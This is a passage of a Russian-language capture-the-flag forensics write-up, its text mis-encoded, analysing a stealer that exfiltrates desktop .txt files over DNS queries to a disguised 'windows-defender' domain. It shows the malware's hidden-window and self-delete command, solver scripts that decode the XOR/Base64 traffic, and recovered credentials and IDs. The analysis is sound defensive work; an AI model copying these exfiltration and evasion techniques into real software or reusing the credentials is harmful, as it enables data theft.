   - üîê –î–≤–æ–π–Ω–æ–µ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ:
     1. XOR —Å –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–º –∫–ª—é—á–æ–º
     2. –ö–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ Base64

3. **–ü–µ—Ä–µ–¥–∞—á–∞ –¥–∞–Ω–Ω—ã—Ö**  
   - üì° –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ —Å–∫—Ä—ã—Ç—ã–π –º–µ—Ç–æ–¥:  
     ```csharp
     Class1.smethod_1()
     ```

### üìå –≠—Ç–∞–ø –∫—Ä–∞–∂–∏ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤
4. **–ü–æ–∏—Å–∫ –∏ –∫—Ä–∞–∂–∞ —Ñ–∞–π–ª–æ–≤**  
   - üîç –°–∫–∞–Ω–∏—Ä—É–µ—Ç —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª
   - üìù –ò—â–µ—Ç —Ñ–∞–π–ª—ã —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º `.txt`  
   - ‚úÇÔ∏è –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∫–∞–∂–¥—ã–π —Ñ–∞–π–ª –±–ª–æ–∫–∞–º–∏ –ø–æ **35 –±–∞–π—Ç**  
   - üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —á–µ—Ä–µ–∑ —Ç–æ—Ç –∂–µ –º–µ—Ö–∞–Ω–∏–∑–º (`Class1.smethod_1`)

### üíÄ –§–∏–Ω–∞–ª—å–Ω—ã–π —ç—Ç–∞–ø
5. **–°–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ**  
   - üóëÔ∏è –ß–µ—Ä–µ–∑ 1 —Å–µ–∫—É–Ω–¥—É –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:  
     ```cmd
     timeout /t 1 && del "[–ø—É—Ç—å_–∫_—Ñ–∞–π–ª—É]"
     ```
   - üõ°Ô∏è –ò—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–∫—Ä—ã—Ç—ã–π —Ä–µ–∂–∏–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:  
     ```csharp
     CreateNoWindow = true
     WindowStyle = Hidden
     ```

## –û—Ç–≤–µ—Ç: caplag{TU‚Ññn31iNG}

## Q8) –£–∫–∞–∂–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø–µ—Ä–≤–æ–≥–æ —É–∫—Ä–∞–¥–µ–Ω–Ω–µ–≥–æ —Ñ–∞–π–ª–∞. (filename.ext)

### –í–æ–∑–≤—Ä–∞—â–∞–µ–º—Å—è –∫ dns –∑–∞–ø—Ä–æ—Å–∞–º

![](./screens/screen12.PNG)

### –ë–µ—Ä–µ–º –ø–µ—Ä–≤—ã–π dns query name:

```
TEBCxz8IhYxwjCgoXFtTCyT5wAlgRd2Vg1eGgWAEcUX5/Z3jWtKJdHlNQfnZ5Zoe0oV0AUFsrfzBtzPDuGg==.PCGW9OVUHB4eOTB6J43r.windows-defender.live-control
```

### –î–µ–∫–æ–¥–∏—Ä—É–µ–º –Ω–∞–∑–≤–∞–Ω–∏–µ:

```python
import base64

encrypted_data = "EBCxz8IhYxwjCgoXFtTCyT5wAlgRd2Vg1eGgWAEcUX5/Z3jWtKJdHlNQfnZ5Zoe0oV0AUFsrfzBtzPDuGg=="
xor_key = "TU‚Ññn31iNG"

def decrypt(encrypted: str, key: str) -> str:
    key_bytes = key.encode()
    decrypted = bytes([base64.b64decode(encrypted)[i] ^ key_bytes[i % len(key_bytes)] 
                     for i in range(len(base64.b64decode(encrypted)))])
    return decrypted.decode(errors='ignore')

decrypted_result = decrypt(encrypted_data, xor_key)
print(f"Decrypted: {decrypted_result}")
```

```
(.venv) PS C:\Users\scrock_\Desktop\a\LABS\SEMESTR 9\BD> .\.venv\Scripts\python.exe .\–û–¢–ß–ï–¢–´\ctf.py
Decrypted: DESKTOP-JDMCC6F_PC31_0157e662-8083-4043-b901-3e0733a2e8d8.txt
```

## –û—Ç–≤–µ—Ç: caplag{DESKTOP-JDMCC6F_PC31_0157e662-8083-4043-b901-3e0733a2e8d8.txt}

## Q9) –ö–∞–∫–æ–π –ª–æ–≥–∏–Ω –∏ –ø–∞—Ä–æ–ª—å –æ—Ç —Å–∞–π—Ç–∞ root-me —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (login_pass)?

### –î–∞–ª–µ–µ –Ω–∞–º –Ω—É–∂–Ω–æ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ñ–∞–π–ª—ã, —Å–æ–∑–¥–∞–µ–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é files –∏ –ø–æ –ø—Ä–∏–º–µ—Ä—É –≤—ã—à–µ –ø–æ–ª—É—á–∞–µ–º —Å–ª–µ–¥—É—é—â–∏–π —Å–∫—Ä–∏–ø—Ç:

(Made in GPT)

```python
import subprocess
import base64
import os
import re
from collections import defaultdict

def decode_data(encoded_str, key="TU‚Ññn31iNG"):
    decoded_bytes = base64.b64decode(encoded_str)
    key_bytes = key.encode('utf-8')
    return bytes([decoded_bytes[i] ^ key_bytes[i % len(key_bytes)] 
                for i in range(len(decoded_bytes))])

def extract_dns_queries(pcap_file):
    cmd = [
        'tshark', 
        '-r', pcap_file, 
        '-Y', 'dns.qry.name contains "windows-defender.live-control"',
        '-T', 'fields', 
        '-e', 'dns.qry.name'
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return [line.strip() for line in result.stdout.split('\n') if line.strip()]

def reconstruct_files(queries):
    file_data = defaultdict(list)
    pattern = re.compile(r'^([^\.]+)\.([^\.]+)\.windows-defender\.live-control$')
    
    for query in queries:
        if match := pattern.match(query):
            decoded_data = decode_data(match.group(2))
            file_data[match.group(1)].append(decoded_data)
    
    return {
        decode_data(filename).decode('utf-8', errors='replace'): b''.join(parts)
        for filename, parts in file_data.items()
    }

def main():
    pcap_file = r"task.pcapng"
    output_dir = "files"
    
    for filename, data in reconstruct_files(extract_dns_queries(pcap_file)).items():
        safe_name = re.sub(r'[\\/*?:"<>|]', "_", filename)
        with open(os.path.join(output_dir, safe_name), 'wb') as f:
            f.write(data)
        print(f"Saved: {safe_name} ({len(data)} bytes)")

if __name__ == "__main__":
    main()
```

### –†–µ–∑—É–ª—å—Ç–∞—Ç:

```
‚îå‚îÄ‚îÄ(myenv)‚îÄ(root„âøscrock)-[~/mnt/chall1/task]
‚îî‚îÄ# python3 sc.py           
Saved: Personal.txt (258 bytes)
Saved: SecretData.txt (14924 bytes)
```

–ù–æ –∑–∞–º–µ—á–∞–µ–º, —á—Ç–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞ DESKTOP-JDMCC6F_PC31_0157e662-8083-4043-b901-3e0733a2e8d8.txt –Ω–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏–ª–æ—Å—å (–∏–∑ –∑–∞ malformed dns packets), –ø–æ—ç—Ç–æ–º—É:

### –í—Ä—É—á–Ω—É—é –¥–æ—Å—Ç–∞–µ–º –∏–∑ dns queries names –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π —Ñ–∞–π–ª –∏ –¥–µ–∫–æ–¥–∏—Ä—É–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ:

```python
import base64

key = "TU‚Ññn31iNG".encode()
blocks = [
    "PCGW9OVUHB4eOTB6J43r", "IHiP4bgBQVZGMik7IYf8", "NTiS6PMuVl0MLTMmOoyq",
    "JCeN8PkAHVwIJysoAtG2", "HADB965cSgVednQ8IMbu", "EDuG8f85fEsIb008IZb0",
    "J2/Nq/oBVFgHYD41PY3r", "ejaN6bkPUFIGOykgeoH2", "MTSW4eoIWkMaOik1OIew",
    "ZGzQt+o5VlACAyY6PIi2", "ZTzRvPJcAGY6Bj0jXw=="
]

decrypted = bytearray()
for block in blocks:
    decrypted.extend(b ^ key[i % len(key)] for i, b in enumerate(base64.b64decode(block)))

print(decrypted.decode('utf-8', errors='replace'))
```

### –†–µ–∑—É–ª—å—Ç–∞—Ç:

```
https://www.root-me.org/|notexample@electron.proton.mail|W32HU#s82y4783hu$jDnduiWOza!
https://login.yahoo.com/account/create|firstname40923|WeakManij21i38d23WSHzw
```

## –û—Ç–≤–µ—Ç: caplag{notexample@electron.proton.mail_W32HU#s82y4783hu$jDnduiWOza!} 

## Q10) –£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ —Ä–∞–±–æ—á–µ–º —Å—Ç–æ–ª–µ —Ö—Ä–∞–Ω–∏–ª—Å—è —Ñ–∞–π–ª —Å–æ –≤—Å–µ–º–∏ ID —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–æ–≤. –ö–∞–∫–æ–π ID —É –°–æ–Ω–∏?

```
‚îå‚îÄ‚îÄ(myenv)‚îÄ(root„âøscrock)-[~/mnt/chall1/task]
‚îî‚îÄ# cat files/Personal.txt 
--------Name ---- ID ------

        Sonya   412981238JS
        Jan     012390841QL
        Lola    912308498ZX
        Mihail  130157146FW
        Sandy   958933438XE
--------Name ---- ID ------

        Sonya   412981238JS
        Jan     012390841QL
        Lola    912308498ZX
        Mihail  130157146FW
        Sandy   958933438XE
```

## –û—Ç–≤–µ—Ç: caplag{412981238JS}

## Q11) –í–æ —Å–∫–æ–ª—å–∫–æ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å windows –≤—ã–∫–ª—é—á–∏–ª—Å—è –∏–∑ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ —Ä–µ–∂–∏–º–∞ (–¥–¥:–º–º:–≥–≥–≥–≥_—á—á:–º–º:—Å—Å)?

### –û—Ç–∫—Ä—ã–≤–∞–µ–º –∂—É—Ä–Ω–∞–ª Microsoft-Windows-Windows Defender%4Operational.evtx

![](./screens/screen13.jpg)

## –û—Ç–≤–µ—Ç: caplag{25:06:2025_06:34:16}
